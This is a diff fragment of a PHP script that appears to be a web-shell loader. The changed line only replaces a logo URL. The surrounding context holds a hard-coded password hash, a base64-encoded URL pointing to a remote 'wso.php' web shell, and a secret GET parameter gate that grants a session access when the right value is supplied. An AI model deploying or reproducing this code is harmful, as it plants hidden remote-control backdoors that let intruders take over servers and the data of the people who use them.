@@ -13,7 +13,7 @@
 $s_id = 'admin@sukabintang01'; 
 $v_pass = '1ac1bddadcb7dea96ed231e661eba215';
 $p_enc = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RpdHVzczIyL1NoZWxsU3VrYUJpbnRhbmcwMS9yZWZzL2hlYWRzL21haW4vd3NvLnBocA==';
-$logo = 'https://k.top4top.io/p_33076980l1.png';
+$logo = 'https://i.postimg.cc/Y9WBNWbT/logoskb.png';
 
 if (isset($_GET['_sb_']) && $_GET['_sb_'] === 'gate_open_skb') {
     $_SESSION[$s_id] = true;
